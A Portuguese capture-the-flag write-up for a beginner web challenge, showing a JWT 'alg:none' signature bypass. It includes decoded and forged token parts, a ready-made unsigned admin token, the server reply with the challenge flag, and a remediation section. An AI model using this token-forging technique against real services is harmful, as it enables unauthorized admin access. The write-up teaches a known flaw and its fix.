<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Manager+area" alt="Typing SVG" /></a>

</div>

# Manager area — WEB (INTRO) · 🟢 FÁCIL

- **Status:** ✅ RESOLVIDO — forja de JWT via `alg:none`: token sem assinatura com `role: admin`
- **Pontos:** 100
- **Anexo / Alvo:** `https://manager.cyberzerk.fr/` (área de manager da Tricatel, autorização por JWT)
- **Enunciado:** *"Tricatel's manager area is protected by a JWT token. Your account is only 'employee'. An exhausted dev botched the token check one night of production... Get admin access and collect the CODIR bonus table."*
- **Flag:** `CyberZerk{JWT_4lg_N0n3_C_3st_N0n}`

---

## TL;DR

1. O acesso é controlado por um **JWT** no cookie `session`. Header `{"alg":"HS256",...}`, payload `{"user":"employe8472","role":"employe"}`.
2. A dica interna entrega o vetor: *"il accepte même les jetons sans signature"* → o backend honra **`alg:none`** (aceita token sem assinatura).
3. Forja-se um token novo com `alg:none` + `role:admin` e **sem a 3ª parte** (`header.payload.`). Trocado no cookie, o servidor loga como admin e devolve a tabela do CODIR com a flag.

## Análise

### Recon — anatomia do JWT

O cookie `session` é um JWT (três partes Base64URL separadas por ponto). Decodando header e payload (só Base64, nada de criptografia):

```
header   = {"alg":"HS256","typ":"JWT"}
payload  = {"user":"employe8472","role":"employe"}
assinatura = s9ip1Qa...jeg6sM   (HMAC-SHA256 — 32 bytes crus; decoda pra lixo binário, confirmando que é a assinatura)
```

A página de manager recusa: *"Accès refusé : cet espace est réservé au rôle `admin`"*. A autorização depende do campo `role` **dentro do token** — um valor que o cliente carrega.

### Confirmação — o `alg` controla a validação

O header declara **como** o servidor valida a assinatura. A dica do dev exausto (*"le contrôle des jetons a été bâclé une nuit de prod… il accepte même les jetons sans signature"*) aponta o bug clássico: o código honra `alg: none`.

Com `alg: none`, a spec do JWT define que **não há assinatura a validar** — o token é aceito como está. Ou seja, o cliente escolhe o algoritmo e escolhe "não me valide". Quem controla o campo que decide se haverá checagem é o atacante.

### Exploração — forja do token

Cada parte é codificada **separadamente** em Base64URL **sem padding** (`A-Za-z0-9-_`, sem `=`), e a assinatura é **omitida** (ponto final vazio):

```
header forjado  = {"alg":"none","typ":"JWT"}            → eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
payload forjado = {"user":"employe8472","role":"admin"} → eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiYWRtaW4ifQ
```

Token final (repare nos **dois pontos**, nada depois do último):

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiYWRtaW4ifQ.
```

Trocando o valor do cookie `session` por esse token (DevTools → Application → Cookies, ou direto no `curl`), o servidor responde:

```
Jeton présenté : rôle admin
Tableau des primes du CODIR (réservé aux managers) :
...
CyberZerk{JWT_4lg_N0n3_C_3st_N0n}
```

(O nome da flag é o trocadilho francês: *"alg none, c'est non"*.)

## O que não funcionou

| Hipótese | Resultado | Por quê |
|---|---|---|
| Decodar o token inteiro como **um** Base64, editar e re-encodar tudo junto | ✗ | JWT são 3 Base64URL **separados** por pontos; re-encodar o blob inteiro apaga os pontos e cola o lixo da assinatura antiga — o servidor nem separa header de payload |
| Deixar o padding `=`/`==` nas partes | ✗ | JWT é Base64**URL** sem padding; os `=` quebram o parse — tem que remover |
| Quebrar o segredo do HMAC (`HS256`) | ✗ (desnecessário) | Com `alg:none` aceito, não há assinatura a forjar — não precisa da chave |

## Conclusão

Reto INTRO de **JWT `alg:none` / signature bypass**: o backend lê o algoritmo declarado **no próprio token** para decidir como validá-lo, e aceita `none` (sem assinatura) numa rota autenticada. A correção é o servidor **impor o algoritmo esperado** (allowlist, ex. só `HS256`) e **rejeitar `none`**, validando a assinatura com a chave do servidor — nunca confiar no `alg` que o cliente manda. Flag obtida e confirmada na plataforma.

---

## Apêndice — ferramentas

- **CyberChef** — decodar header/payload (JWT Decode / From Base64) e codificar as partes forjadas (To Base64, alphabet `A-Za-z0-9-_` sem padding).
- `exploit.sh` — `curl` que manda o cookie `session` já com o token forjado e extrai a flag do HTML. O `cf_clearance` (Cloudflare) está anonimizado como `<TOKEN>`; o JWT do cookie é o token forjado (derivado do reto, fica).
- `output.txt` — resposta HTML do alvo com a tabela do CODIR e a flag.
- Forja também possível com `jwt_tool.py <token> -X a` (modo "alg none" embutido).
